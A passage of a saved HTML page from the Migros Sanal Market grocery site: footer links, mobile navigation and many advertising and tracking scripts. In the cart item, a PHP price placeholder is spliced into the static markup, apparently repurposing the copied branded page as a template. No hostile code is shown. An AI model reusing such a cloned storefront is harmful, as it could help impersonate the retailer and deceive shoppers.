                        <div _ngcontent-isc-c299="" class="mobile-app-link ng-star-inserted">
                          <a _ngcontent-isc-c299="" target="_blank" rel="noopener" href="https://apps.apple.com/tr/app/migros-sanal-market/id397585390?l=tr">
                            <img _ngcontent-isc-c299="" felazyload="" alt="" src="assets/logos/mobile-app/app-store.svg">
                          </a>
                        </div>
                        <div _ngcontent-isc-c299="" class="mobile-app-link ng-star-inserted">
                          <a _ngcontent-isc-c299="" target="_blank" rel="noopener" href="https://play.google.com/store/apps/details?id=com.inomera.sm">
                            <img _ngcontent-isc-c299="" felazyload="" alt="" src="assets/logos/mobile-app/google-play.svg">
                          </a>
                        </div>
                        <div _ngcontent-isc-c299="" class="mobile-app-link ng-star-inserted">
                          <a _ngcontent-isc-c299="" target="_blank" rel="noopener" href="https://appgallery.huawei.com/#/app/C101624469">
                            <img _ngcontent-isc-c299="" felazyload="" alt="" src="assets/logos/mobile-app/app-gallery.svg">
                          </a>
                        </div>
                        <!---->
                      </div>
                      <div _ngcontent-isc-c299="" class="mdc-layout-grid__cell--span-6 mdc-layout-grid__cell--span-3-tablet mdc-layout-grid__cell--span-12-phone">
                        <p _ngcontent-isc-c299="" class="title">Bizi Takip Edin</p>
                        <div _ngcontent-isc-c299="" class="socials">
                          <a _ngcontent-isc-c299="" target="_blank" rel="noopener" href="https://www.instagram.com/migros_tr" class="ng-star-inserted">
                            <img _ngcontent-isc-c299="" felazyload="" alt="" src="assets/logos/social/instagram.svg">
                          </a>
                          <a _ngcontent-isc-c299="" target="_blank" rel="noopener" href="https://www.facebook.com/MigrosTurkiye" class="ng-star-inserted">
                            <img _ngcontent-isc-c299="" felazyload="" alt="" src="assets/logos/social/facebook.svg">
                          </a>
                          <a _ngcontent-isc-c299="" target="_blank" rel="noopener" href="https://twitter.com/Migros_Turkiye" class="ng-star-inserted">
                            <img _ngcontent-isc-c299="" felazyload="" alt="" src="assets/logos/social/x.svg">
                          </a>
                          <a _ngcontent-isc-c299="" target="_blank" rel="noopener" href="https://www.youtube.com/user/TVMigros" class="ng-star-inserted">
                            <img _ngcontent-isc-c299="" felazyload="" alt="" src="assets/logos/social/youtube.svg">
                          </a>
                          <a _ngcontent-isc-c299="" target="_blank" rel="noopener" href="https://www.linkedin.com/company/migros-ticaret" class="ng-star-inserted">
                            <img _ngcontent-isc-c299="" felazyload="" alt="" src="assets/logos/social/linkedin.svg">
                          </a>
                          <!---->
                        </div>
                        <div _ngcontent-isc-c299="" class="nearest-migros">
                          <a _ngcontent-isc-c299="" routerlink="en-yakin-migros" href="/en-yakin-migros">
                            <fa-icon _ngcontent-isc-c299="" class="ng-fa-icon">
                              <svg role="img" aria-hidden="true" focusable="false" data-prefix="fas" data-icon="location-dot" class="svg-inline--fa fa-location-dot" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 384 512">
                                <path fill="currentColor" d="M215.7 499.2C267 435 384 279.4 384 192C384 86 298 0 192 0S0 86 0 192c0 87.4 117 243 168.3 307.2c12.3 15.3 35.1 15.3 47.4 0zM192 256c-35.3 0-64-28.7-64-64s28.7-64 64-64s64 28.7 64 64s-28.7 64-64 64z"></path>
                              </svg>
                            </fa-icon> En Yakın Migros
                          </a>
                        </div>
                        <p _ngcontent-isc-c299="" class="title">Dijital Dergilerimiz</p>
                        <div _ngcontent-isc-c299="" class="digital ng-star-inserted">
                          <a _ngcontent-isc-c299="" target="_blank" rel="noopener" href="https://www.money.com.tr/mc/kampanyalara-bak/migroskop-dijital/83">
                            <span _ngcontent-isc-c299="" class="align-helper"></span>
                            <img _ngcontent-isc-c299="" felazyload="" alt="" src="assets/icons/digital-magazine/migroskop.jpg"> Migroskop </a>
                        </div>
                        <div _ngcontent-isc-c299="" class="digital ng-star-inserted">
                          <a _ngcontent-isc-c299="" target="_blank" rel="noopener" href="https://www.money.com.tr/mc/kampanyalara-bak/anne-bebek-dijital/92">
                            <span _ngcontent-isc-c299="" class="align-helper"></span>
                            <img _ngcontent-isc-c299="" felazyload="" alt="" src="assets/icons/digital-magazine/anne-bebek.jpg"> Anne-Bebek </a>
                        </div>
                        <!---->
                      </div>
                      <div _ngcontent-isc-c299="" class="mdc-layout-grid__cell--span-12 mdc-layout-grid__cell--span-3-tablet mdc-layout-grid__cell--span-12-phone logos-wrapper">
                        <a _ngcontent-isc-c299="" href="https://www.money.com.tr/" target="_blank" rel="noopener">
                          <img _ngcontent-isc-c299="" felazyload="" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAA8AAAAKCAYAAABrGwT5AAAAF0lEQVR42mN89uzxfwYyAeOo5lHNhAAA7jIk17T4Y6wAAAAASUVORK5CYII=" alt="money-logo" class="money logo">
                        </a>
                        <a _ngcontent-isc-c299="" href="https://migrostv.migros.com.tr/" target="_blank" rel="noopener">
                          <img _ngcontent-isc-c299="" felazyload="" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAA8AAAAKCAYAAABrGwT5AAAAF0lEQVR42mN89uzxfwYyAeOo5lHNhAAA7jIk17T4Y6wAAAAASUVORK5CYII=" alt="migros-tv-logo" class="migros-tv logo">
                        </a>
                        <a _ngcontent-isc-c299="" href="https://www.money.com.tr/mc/money-ozelliklerini-kesfet/saglikli-yasam-yolculugum/123" target="_blank" rel="noopener">
                          <img _ngcontent-isc-c299="" felazyload="" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAA8AAAAKCAYAAABrGwT5AAAAF0lEQVR42mN89uzxfwYyAeOo5lHNhAAA7jIk17T4Y6wAAAAASUVORK5CYII=" alt="saglikli-yasam-logo" class="saglikli-yasam logo">
                        </a>
                        <a _ngcontent-isc-c299="" href="https://migrostv.migros.com.tr/kadin-akademisi/" target="_blank" rel="noopener">
                          <img _ngcontent-isc-c299="" src="assets/logos/migros/kadin-akademisi.png" alt="kadin-akademisi-logo" class="kadin-akademisi logo">
                        </a>
                      </div>
                    </div>
                  </div>
                </div>
              </sm-footer-links>
              <div _ngcontent-isc-c301="" class="divider"></div>
            </div>
            <!---->
            <sm-footer-logos _ngcontent-isc-c301="" _nghost-isc-c300="">
              <div _ngcontent-isc-c300="" class="logos-wrapper lite">
                <div _ngcontent-isc-c300="" class="inner">
                  <div _ngcontent-isc-c300="" class="mdc-layout-grid__cell--span-10 mdc-layout-grid__cell--span-4-phone mdc-layout-grid__cell--span-8-tablet">
                    <div _ngcontent-isc-c300="" class="logo-container">
                      <a _ngcontent-isc-c300="" href="/">
                        <img _ngcontent-isc-c300="" felazyload="" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAA8AAAAKCAYAAABrGwT5AAAAF0lEQVR42mN89uzxfwYyAeOo5lHNhAAA7jIk17T4Y6wAAAAASUVORK5CYII=" alt="migros-logo" class="migros-logo">
                      </a>
                      <div _ngcontent-isc-c300="" class="copyright text-color-grey">Ürün fiyatlarına KDV bedeli dahildir. ©Migros 2024</div>
                    </div>
                  </div>
                  <div _ngcontent-isc-c300="" class="logos">
                    <a _ngcontent-isc-c300="" id="footer-logos-eyebrand" href="https://www.blindlook.com/eyebrand-profile/migrossanalmarket" target="_blank" rel="noopener">
                      <img _ngcontent-isc-c300="" felazyload="" id="footer-logos-eyebrand-img" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAA8AAAAKCAYAAABrGwT5AAAAF0lEQVR42mN89uzxfwYyAeOo5lHNhAAA7jIk17T4Y6wAAAAASUVORK5CYII=" alt="blindlook-logo" class="blindlook-logo logo">
                    </a>
                    <a _ngcontent-isc-c300="" href="https://www.anadolugrubu.com.tr/" target="_blank" rel="noopener">
                      <img _ngcontent-isc-c300="" felazyload="" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAA8AAAAKCAYAAABrGwT5AAAAF0lEQVR42mN89uzxfwYyAeOo5lHNhAAA7jIk17T4Y6wAAAAASUVORK5CYII=" alt="anadolu-grubu-logo" class="anadolu-grubu-logo logo">
                    </a>
                    <a _ngcontent-isc-c300="" href="https://gidanikoru.com/" target="_blank" rel="noopener">
                      <img _ngcontent-isc-c300="" felazyload="" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAA8AAAAKCAYAAABrGwT5AAAAF0lEQVR42mN89uzxfwYyAeOo5lHNhAAA7jIk17T4Y6wAAAAASUVORK5CYII=" alt="gidani-koru-logo" class="gidani-koru-logo logo">
                    </a>
                    <a _ngcontent-isc-c300="" href="https://www.guvendamgasi.org.tr/firmay.php?Guid=7fb4da7e-00cd-11ea-b063-48df373f4850" target="_blank" rel="noopener">
                      <img _ngcontent-isc-c300="" felazyload="" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAA8AAAAKCAYAAABrGwT5AAAAF0lEQVR42mN89uzxfwYyAeOo5lHNhAAA7jIk17T4Y6wAAAAASUVORK5CYII=" alt="guven-damgasi-logo" class="logo guven-damgasi-logo">
                    </a>
                    <div _ngcontent-isc-c300="" class="ETBIS">
                      <div _ngcontent-isc-c300="" id="77DC0C5568104C829695C04726B02F78">
                        <a _ngcontent-isc-c300="" href="https://etbis.eticaret.gov.tr/sitedogrulama/77DC0C5568104C829695C04726B02F78" target="_blank">
                          <img _ngcontent-isc-c300="" src="assets/logos/etbis/etbis.jpg" alt="etbis-logo">
                        </a>
                      </div>
                    </div>
                  </div>
                </div>
              </div>
            </sm-footer-logos>
          </div>
          <sm-mobile-bottom-nav _ngcontent-isc-c301="" _nghost-isc-c298="">
            <nav _ngcontent-isc-c298="" class="container mobile-only ng-star-inserted">
              <div _ngcontent-isc-c298="" class="nav-item ng-star-inserted" tabindex="0" id="mobile-navbar-item-0">
                <img _ngcontent-isc-c298="" src="https://www.migros.com.tr//assets/icons/bottom-navigation/home-passive.svg" alt="AnasayfaIcon">
                <!---->
                <div _ngcontent-isc-c298="" class="text mat-caption-normal text-align-center"> Anasayfa </div>
              </div>
              <div _ngcontent-isc-c298="" class="nav-item ng-star-inserted" tabindex="0" id="mobile-navbar-item-1">
                <img _ngcontent-isc-c298="" src="https://www.migros.com.tr//assets/icons/bottom-navigation/search-passive.svg" alt="KategorilerIcon">
                <!---->
                <div _ngcontent-isc-c298="" class="text mat-caption-normal text-align-center"> Kategoriler </div>
              </div>
              <div _ngcontent-isc-c298="" class="nav-item ng-star-inserted" id="mobile-navbar-item-2">
                <img _ngcontent-isc-c298="" src="https://www.migros.com.tr//assets/icons/bottom-navigation/cart-passive.svg" alt="SepetimIcon">
                <div _ngcontent-isc-c298="" class="mat-caption-normal quantity ng-star-inserted">1</div>
                <!---->
                <div _ngcontent-isc-c298="" class="text mat-caption-normal text-align-center"> <?php echo $urun["fiyat"];?> TL </div>
              </div>
              <div _ngcontent-isc-c298="" class="nav-item ng-star-inserted" tabindex="0" id="mobile-navbar-item-3">
                <img _ngcontent-isc-c298="" src="https://www.migros.com.tr//assets/icons/bottom-navigation/campaign-passive.svg" alt="KampanyalarIcon">
                <!---->
                <div _ngcontent-isc-c298="" class="text mat-caption-normal text-align-center"> Kampanyalar </div>
              </div>
              <div _ngcontent-isc-c298="" class="nav-item ng-star-inserted" tabindex="0" id="mobile-navbar-item-4">
                <img _ngcontent-isc-c298="" src="https://www.migros.com.tr//assets/icons/bottom-navigation/profile-passive.svg" alt="HesabımIcon">
                <!---->
                <div _ngcontent-isc-c298="" class="text mat-caption-normal text-align-center"> Hesabım </div>
              </div>
              <!---->
            </nav>
            <!---->
          </sm-mobile-bottom-nav>
        </sm-footer>
        <!---->
        <fe-product-cookie-indicator _ngcontent-isc-c377="" _nghost-isc-c170="">
          <!---->
        </fe-product-cookie-indicator>
        <!---->
        <!---->
        <!---->
      </div>
    </sm-root>
    <script src="runtime.94da1d2ff99c20db.js" type="module"></script>
    <script src="polyfills.67e60b6f51f5b364.js" type="module"></script>
    <script src="scripts.5ed387f44b8881c3.js" defer=""></script>
    <script src="main.6e300704447317f8.js" type="module"></script>
    <script defer="" src="https://static.cloudflareinsights.com/beacon.min.js/v84a3a4012de94ce1a686ba8c167c359c1696973893317" integrity="sha512-euoFGowhlaLqXsPWQ48qSkBSCFs3DPRyiwVu3FjR96cMPx+Fr+gpWRhIafcHwqwCqWS42RZhIudOvEI+Ckf6MA==" data-cf-beacon="{&quot;rayId&quot;:&quot;85cb31b44d0a7218&quot;,&quot;version&quot;:&quot;2024.2.1&quot;,&quot;token&quot;:&quot;9341cbf513954834b406c4b23b064434&quot;}" crossorigin="anonymous"></script>
    <div class="cdk-live-announcer-element cdk-visually-hidden" aria-atomic="true" aria-live="polite"></div>
    <div class="cdk-overlay-container sanalmarket"></div>
    <script type="text/javascript" id="">
      function getUrlVars() {
        var c = {};
        window.location.href.replace(/[?&]+([^=&]+)=([^&]*)/gi, function(a, b, d) {
          c[b] = d
        });
        return c
      }

      function createCookie(c, a, b) {
        if (b) {
          var d = new Date;
          d.setTime(d.getTime() + 864E5 * b);
          b = "; expires\x3d" + d.toGMTString()
        } else b = "";
        document.cookie = c + "\x3d" + a + b + "; path\x3d/"
      }

      function deleteCookie(c) {
        var a = new Date;
        a.setTime(a.getTime() - 864E5);
        a = "; expires\x3d" + a.toGMTString();
        document.cookie = c + "\x3d" + a + "; path\x3d/"
      }
      getUrlVars().utm_source ? (createCookie("pfx_lastclick", getUrlVars().utm_source, 7), getUrlVars().pfx ? createCookie("pfx", getUrlVars().pfx, 7) : deleteCookie("pfx")) : getUrlVars().gclid && createCookie("pfx_lastclick", "adwords", 7);
    </script>
    <script type="text/javascript" id="pap_x2s6df8d" src="https://affiliate.migros.com.tr/scripts/trackjs.js"></script>
    <script type="text/javascript" id="">
      ! function(a, d, b, k, l, g, h, c, f) {
        a.Adjust = a.Adjust || {};
        a.Adjust_q = a.Adjust_q || [];
        for (b = 0; b < g.length; b++) h(a.Adjust, a.Adjust_q, g[b]);
        c = d.createElement("script");
        f = d.getElementsByTagName("script")[0];
        c.async = !0;
        c.src = "https://cdn.adjust.com/adjust-latest.min.js";
        c.onload = function() {
          for (var e = 0; e < a.Adjust_q.length; e++) a.Adjust[a.Adjust_q[e][0]].apply(a.Adjust, a.Adjust_q[e][1]);
          a.Adjust_q = []
        };
        f.parentNode.insertBefore(c, f)
      }(window, document, 0, 0, 0, "initSdk trackEvent addGlobalCallbackParameters addGlobalPartnerParameters removeGlobalCallbackParameter removeGlobalPartnerParameter clearGlobalCallbackParameters clearGlobalPartnerParameters switchToOfflineMode switchBackToOnlineMode stop restart gdprForgetMe disableThirdPartySharing".split(" "), function(a, d, b) {
        a[b] = function() {
          d.push([b, arguments])
        }
      });
      Adjust.initSdk({
        appToken: google_tag_manager["rm"]["11483837"](13),
        environment: google_tag_manager["rm"]["11483837"](14)
      });
    </script>
    <script type="text/javascript" id="">
      (function() {
        function d() {
          return "xxxxxxxx-xxxx-4xxx-yxxx-xxxxxxxxxxxx".replace(/[xy]/g, function(a) {
            var b = 16 * Math.random() | 0;
            a = "x" == a ? b : b & 3 | 8;
            return a.toString(16)
          })
        }
        var c = "rnid";
        if (!document.cookie.match(new RegExp("^(?:.*;)?\\s*" + c + "\\s*\x3d\\s*([^;]+)(?:.*)?$"))) {
          var e = d(),
            f = (new Date(2147483647E3)).toUTCString();
          document.cookie = c + "\x3d" + e + "; SameSite\x3dNone; Secure; expires\x3d" + f + "; path\x3d/; domain\x3d." + location.hostname.replace(/^www\./i, "")
        }
      })();
    </script>
    <script type="text/javascript" id="">
      function createCookie(c, d, a) {
        if (a) {
          var b = new Date;
          b.setTime(b.getTime() + 864E5 * a);
          a = "; expires\x3d" + b.toGMTString()
        } else a = "";
        document.cookie = c + "\x3d" + d + a + "; path\x3d/"
      }
      null != google_tag_manager["rm"]["11483837"](15) ? createCookie("lastSource", "google / cpc", 30) : null != google_tag_manager["rm"]["11483837"](17) ? createCookie("lastSource", "undefined / undefined / undefined", 30) : 1 == google_tag_manager["rm"]["11483837"](22) ? createCookie("lastSource", "organic", 30) : null == google_tag_manager["rm"]["11483837"](24) && 1 == google_tag_manager["rm"]["11483837"](26) && createCookie("lastSource", "direct", 30);
    </script>
    <script type="text/javascript" id="">
      (function() {
        var b = document.getElementsByTagName("head")[0],
          a = document.createElement("script");
        a.async = !0;
        a.src = "https://tags.bluekai.com/site/83669?ret\x3djs\x26limit\x3d1";
        b.appendChild(a)
      })();
    </script>
    <script type="text/javascript" id="">
      String.prototype.turkishtoEnglish = function() {
        return this.replace("\u011e", "g").replace("\u00dc", "u").replace("\u015e", "s").replace("I", "i").replace("\u0130", "i").replace("\u00d6", "o").replace("\u00c7", "c").replace("\u011f", "g").replace("\u00fc", "u").replace("\u015f", "s").replace("\u0131", "i").replace("\u00f6", "o").replace("\u00e7", "c")
      };
      String.prototype.bluekaienc = function() {
        return encodeURI(this.turkishtoEnglish().toLowerCase().replace(" ", "_"))
      };
      (function() {
        var b = document.getElementsByTagName("body")[0],
          a = document.createElement("script");
        a.async = !0;
        a.src = "https://tags.bkrtx.com/js/bk-coretag.js";
        b.appendChild(a)
      })();
    </script>
    <script async="" src="https://tags.bkrtx.com/js/bk-coretag.js"></script>
    <script type="text/javascript" id="">
      window.bk_async = function() {
        bk_addPageCtx("e_id_m", google_tag_manager["rm"]["11483837"](47));
        BKTAG.doTag(84003, 10)
      };
    </script>
    <script type="text/javascript" id="">
      var pPath = google_tag_manager["rm"]["11483837"](48),
        sQuery = google_tag_manager["rm"]["11483837"](49),
        r = google_tag_manager["rm"]["11483837"](50) + "?q\x3d" + google_tag_manager["rm"]["11483837"](51);
      "/arama" == google_tag_manager["rm"]["11483837"](52) ? localStorage.setItem("pPath_sQuery", google_tag_manager["rm"]["11483837"](53) + "?q\x3d" + google_tag_manager["rm"]["11483837"](54)) : localStorage.setItem("pPath_sQuery", google_tag_manager["rm"]["11483837"](55));
    </script>
    <script type="text/javascript" id="">
      ! function(d, c, b, e, a, f, g) {
        d.fbq || (a = d.fbq = function() {
          a.callMethod ? a.callMethod.apply(a, arguments) : a.queue.push(arguments)
        }, d._fbq || (d._fbq = a), a.push = a, a.loaded = !0, a.version = "2.0", a.queue = [], f = c.createElement(b), f.async = !0, f.src = e, g = c.getElementsByTagName(b)[0], g.parentNode.insertBefore(f, g))
      }(window, document, "script", "https://connect.facebook.net/en_US/fbevents.js");
      fbq.allowDuplicatePageViews = !0;
      fbq.disablePushState = !0;
      fbq.autoLogAppEvents = !1;
      fbq("consent", "grant");
      fbq("init", "497441154013742", {
        external_id: google_tag_manager["rm"]["11483837"](59),
        em: google_tag_manager["rm"]["11483837"](60),
        ph: google_tag_manager["rm"]["11483837"](61)
      });
      fbq.disablePushState = !0;
      fbq.autoLogAppEvents = !1;
      window._gtmUtils = window._gtmUtils || [];
      window._gtmUtils.convertToFacebookProduct = function(d) {
        return d.map(function(c) {
          var b = {};
          b.content_name = c.name;
          b.content_category = c.category.replace(/\//g, "\x3e");
          b.value = c.price.replace(",", ".");
          b.currency = "TRY";
          b.content_type = "product";
          var e = {};
          e.id = c.id;
          e.quantity = c.quantity;
          b.contents = [e];
          return b
        })
      };
    </script>
    <script type="text/javascript" id="">
      fbq("track", "PageView");
    </script>
    <script type="text/javascript" id="">
      var pcode = "https://creativecdn.com/tags?id\x3d" + google_tag_manager["rm"]["11483837"](63) + "_home\x26id\x3d" + google_tag_manager["rm"]["11483837"](65) + "_uid_undefined";
      (function(b, d) {
        var c = "creativecdnIframe",
          a = document.getElementById(c);
        a && a.parentNode.removeChild(a);
        a = b.createElement("iframe");
        a.src = d;
        a.id = c;
        a.style.width = "1px";
        a.style.height = "1px";
        a.style.display = "none";
        b.body.appendChild(a)
      })(document, pcode);
    </script>
    <script type="text/javascript" id="">
      (function() {
        function d() {
          var a = {};
          window.location.href.replace(/[?&]+([^=&]+)=([^&]*)/gi, function(c, b, f) {
            a[b] = f
          });
          return a
        }

        function e(a, c, b) {
          if (b) {
            var f = "domain\x3d" + location.hostname.replace(/^www\./i, "") + ";",
              g = new Date;
            g.setTime(g.getTime() + 864E5 * b);
            b = "; expires\x3d" + g.toGMTString()
          } else b = "";
          document.cookie = a + "\x3d" + c + b + "; SameSite\x3dLax;secure; path\x3d/;" + f
        }

        function h(a) {
          var c = "true" == a.lastclick ? "lc_pfx" : "pc_pfx",
            b = "true" == a.lastclick ? "pfx_lastclick" : "pfx_postclick";
          "false" == a.lastclick && d()[a.variable] == a.source && (e(b, "gelirortaklari", a.cookieWindow), d().pfx && e(c, d().pfx, a.cookieWindow));
          "true" == a.lastclick && (d()[a.variable] ? (e(b, d()[a.variable], a.cookieWindow), d().pfx ? e(c, d().pfx, a.cookieWindow) : (a = c, c = "domain\x3d" + location.hostname.replace(/^www\./i, "") + ";", b = new Date, b.setTime(b.getTime() - 864E5), b = "; expires\x3d" + b.toGMTString(), document.cookie = a + "\x3d" + b + "; SameSite\x3dLax;secure; path\x3d/;" + c)) : d().gclid && e(b, "adwords", 1))
        }(function() {
          var a = document.getElementById("pfx_ap");
          if (void 0 === a || null == a) {
            a = document.createElement("script");
            a.type = "text/javascript";
            a.id = "pfx_ap";
            a.async = !0;
            a.src = "//img2-digitouch.mncdn.com/include/dynamic_click_tag.js";
            var c = document.getElementsByTagName("script")[0];
            c.parentNode.insertBefore(a, c)
          }
        })();
        var k = {
          variable: "utm_source",
          source: "performics",
          lastclick: "false",
          cookieWindow: 7
        };
        h(k)
      })();
    </script>
    <script type="text/javascript" id="">
      if (google_tag_manager["rm"]["11483837"](66)) {
        var bkPush = document.createElement("img");
        bkPush.setAttribute("src", "https://stags.bluekai.com/site/85196?e_id_s\x3d" + google_tag_manager["rm"]["11483837"](67));
        bkPush.setAttribute("width", "1");
        bkPush.setAttribute("height", "1");
        document.body.appendChild(bkPush)
      };
    </script>
    <script type="text/javascript" id="">
      window._adftrack = Array.isArray(window._adftrack) ? window._adftrack : window._adftrack ? [window._adftrack] : [];
      window._adftrack.push({
        HttpHost: "track.adform.net",
        pm: 2443498,
        divider: encodeURIComponent("|"),
        pagename: encodeURIComponent("Tum_sayfalar")
      });
      (function() {
        var a = document.createElement("script");
        a.type = "text/javascript";
        a.async = !0;
        a.src = "https://s2.adform.net/banners/scripts/st/trackpoint-async.js";
        var b = document.getElementsByTagName("script")[0];
        b.parentNode.insertBefore(a, b)
      })();
    </script>
    <iframe src="https://651fc467cc9c0ac5ec9a923e5d6fd34e.safeframe.googlesyndication.com/safeframe/1-0-40/html/container.html" style="visibility: hidden; display: none;"></iframe>
    <noscript>
      <p style="margin:0;padding:0;border:0;">
        <img src="https://track.adform.net/Serving/TrackPoint/?pm=2443498&amp;ADFPageName=Tum_sayfalar&amp;ADFdivider=|" width="1" height="1" alt="">
      </p>
    </noscript>
    <iframe height="0" width="0" style="display: none; visibility: hidden;" src="https://10610902.fls.doubleclick.net/activityi;src=10610902;type=rem;cat=msm-r0;ord=8967588639810;npa=0;auiddc=37027196.1709149487;u20=undefined;ps=1;pcor=334211570;pscdl=noapi;gtm=45fe42q1z8811483837za201;gcs=G111;gcd=13n3n3l3l5;dma=0;uaa=x86;uab=64;uafvl=Chromium%3B122.0.6261.69%7CNot(A%253ABrand%3B24.0.0.0%7CGoogle%2520Chrome%3B122.0.6261.69;uamb=0;uam=;uap=Windows;uapv=10.0.0;uaw=0;epver=2;~oref=https%3A%2F%2Fwww.migros.com.tr%2F?"></iframe>
    <iframe allow="join-ad-interest-group" data-tagging-id="DC-10610902/rem/msm-r0+standard" data-load-time="1709167790903" height="0" width="0" style="display: none; visibility: hidden;" src="https://td.doubleclick.net/td/fls/rul/activityi;fledge=1;src=10610902;type=rem;cat=msm-r0;ord=8967588639810;npa=0;auiddc=37027196.1709149487;u20=undefined;ps=1;pcor=334211570;pscdl=noapi;gtm=45fe42q1z8811483837za201;gcs=G111;gcd=13n3n3l3l5;dma=0;uaa=x86;uab=64;uafvl=Chromium%3B122.0.6261.69%7CNot(A%253ABrand%3B24.0.0.0%7CGoogle%2520Chrome%3B122.0.6261.69;uamb=0;uam=;uap=Windows;uapv=10.0.0;uaw=0;epver=2;~oref=https%3A%2F%2Fwww.migros.com.tr%2F?"></iframe>
    <iframe height="0" width="0" style="display: none; visibility: hidden;" src="https://10610902.fls.doubleclick.net/activityi;src=10610902;type=home;cat=msm-h0;ord=4750764718751;npa=0;auiddc=37027196.1709149487;u14=%2F;u20=undefined;u16=Home;ps=1;pcor=1313833667;pscdl=noapi;gtm=45fe42q1z8811483837za201;gcs=G111;gcd=13n3n3l3l5;dma=0;uaa=x86;uab=64;uafvl=Chromium%3B122.0.6261.69%7CNot(A%253ABrand%3B24.0.0.0%7CGoogle%2520Chrome%3B122.0.6261.69;uamb=0;uam=;uap=Windows;uapv=10.0.0;uaw=0;epver=2;~oref=https%3A%2F%2Fwww.migros.com.tr%2F?"></iframe>
    <iframe allow="join-ad-interest-group" data-tagging-id="DC-10610902/home/msm-h0+standard" data-load-time="1709167790932" height="0" width="0" style="display: none; visibility: hidden;" src="https://td.doubleclick.net/td/fls/rul/activityi;fledge=1;src=10610902;type=home;cat=msm-h0;ord=4750764718751;npa=0;auiddc=37027196.1709149487;u14=%2F;u20=undefined;u16=Home;ps=1;pcor=1313833667;pscdl=noapi;gtm=45fe42q1z8811483837za201;gcs=G111;gcd=13n3n3l3l5;dma=0;uaa=x86;uab=64;uafvl=Chromium%3B122.0.6261.69%7CNot(A%253ABrand%3B24.0.0.0%7CGoogle%2520Chrome%3B122.0.6261.69;uamb=0;uam=;uap=Windows;uapv=10.0.0;uaw=0;epver=2;~oref=https%3A%2F%2Fwww.migros.com.tr%2F?"></iframe>
    <iframe allow="join-ad-interest-group" data-tagging-id="AW-715674769" data-load-time="1709167790972" height="0" width="0" style="display: none; visibility: hidden;" src="https://td.doubleclick.net/td/rul/715674769?random=1709167790964&amp;cv=11&amp;fst=1709167790964&amp;fmt=3&amp;bg=ffffff&amp;guid=ON&amp;async=1&amp;gtm=45be42q1v889281616z8811483837za201&amp;gcd=13n3n3l3l5&amp;dma=0&amp;u_w=1366&amp;u_h=768&amp;url=https%3A%2F%2Fwww.migros.com.tr%2F&amp;hn=www.googleadservices.com&amp;frm=0&amp;tiba=Migros%20Sanal%20Market%3A%20Online%20Market%20Al%C4%B1%C5%9Fveri%C5%9Fi&amp;npa=0&amp;pscdl=noapi&amp;auid=37027196.1709149487&amp;uaa=x86&amp;uab=64&amp;uafvl=Chromium%3B122.0.6261.69%7CNot(A%253ABrand%3B24.0.0.0%7CGoogle%2520Chrome%3B122.0.6261.69&amp;uamb=0&amp;uap=Windows&amp;uapv=10.0.0&amp;uaw=0&amp;fledge=1"></iframe>
    <iframe name="__bkframe" id="__bkframe" title="bk" src="about:blank" style="border: 0px; width: 0px; height: 0px; display: none; position: absolute; clip: rect(0px, 0px, 0px, 0px);"></iframe>
    <div id="criteo-tags-div" style="display: none;"></div>
    <iframe name="google_ads_top_frame" id="google_ads_top_frame" style="display: none; position: fixed; left: -999px; top: -999px; width: 0px; height: 0px;"></iframe>
    <iframe height="0" width="0" title="Criteo DIS iframe" style="display: none;"></iframe>
    <script type="text/javascript" id="">
      (function() {
        var b = document.getElementsByTagName("head")[0],
          a = document.createElement("script");
        a.async = !0;
        a.src = "https://tags.bluekai.com/site/83669?ret\x3djs\x26limit\x3d1";
        b.appendChild(a)
      })();
    </script>
    <script type="text/javascript" id="">
      String.prototype.turkishtoEnglish = function() {
        return this.replace("\u011e", "g").replace("\u00dc", "u").replace("\u015e", "s").replace("I", "i").replace("\u0130", "i").replace("\u00d6", "o").replace("\u00c7", "c").replace("\u011f", "g").replace("\u00fc", "u").replace("\u015f", "s").replace("\u0131", "i").replace("\u00f6", "o").replace("\u00e7", "c")
      };
      String.prototype.bluekaienc = function() {
        return encodeURI(this.turkishtoEnglish().toLowerCase().replace(" ", "_"))
      };
      (function() {
        var b = document.getElementsByTagName("body")[0],
          a = document.createElement("script");
        a.async = !0;
        a.src = "https://tags.bkrtx.com/js/bk-coretag.js";
        b.appendChild(a)
      })();
    </script>
    <script async="" src="https://tags.bkrtx.com/js/bk-coretag.js"></script>
    <script type="text/javascript" id="">
      window.bk_async = function() {
        bk_addPageCtx("e_id_m", google_tag_manager["rm"]["11483837"](192));
        BKTAG.doTag(84003, 10)
      };
    </script>
    <script type="text/javascript" id="">
      var pPath = google_tag_manager["rm"]["11483837"](193),
        sQuery = google_tag_manager["rm"]["11483837"](194),
        r = google_tag_manager["rm"]["11483837"](195) + "?q\x3d" + google_tag_manager["rm"]["11483837"](196);
      "/arama" == google_tag_manager["rm"]["11483837"](197) ? localStorage.setItem("pPath_sQuery", google_tag_manager["rm"]["11483837"](198) + "?q\x3d" + google_tag_manager["rm"]["11483837"](199)) : localStorage.setItem("pPath_sQuery", google_tag_manager["rm"]["11483837"](200));
    </script>
    <script type="text/javascript" id="">
      fbq("track", "PageView");
    </script>
    <script type="text/javascript" id="">
      var pcode = "https://creativecdn.com/tags?id\x3d" + google_tag_manager["rm"]["11483837"](206) + "_basketstatus_" + google_tag_manager["rm"]["11483837"](208) + "\x26id\x3d" + google_tag_manager["rm"]["11483837"](210) + "_uid_undefined";
      (function(b, d) {
        var c = "creativecdnIframe",
          a = document.getElementById(c);
        a && a.parentNode.removeChild(a);
        a = b.createElement("iframe");
        a.src = d;
        a.id = c;
        a.style.width = "1px";
        a.style.height = "1px";
        a.style.display = "none";
        b.body.appendChild(a)
      })(document, pcode);
    </script>
    <script type="text/javascript" id="">
      (function() {
        function d() {
          var a = {};
          window.location.href.replace(/[?&]+([^=&]+)=([^&]*)/gi, function(c, b, f) {
            a[b] = f
          });
          return a
        }

        function e(a, c, b) {
          if (b) {
            var f = "domain\x3d" + location.hostname.replace(/^www\./i, "") + ";",
              g = new Date;
            g.setTime(g.getTime() + 864E5 * b);
            b = "; expires\x3d" + g.toGMTString()
          } else b = "";
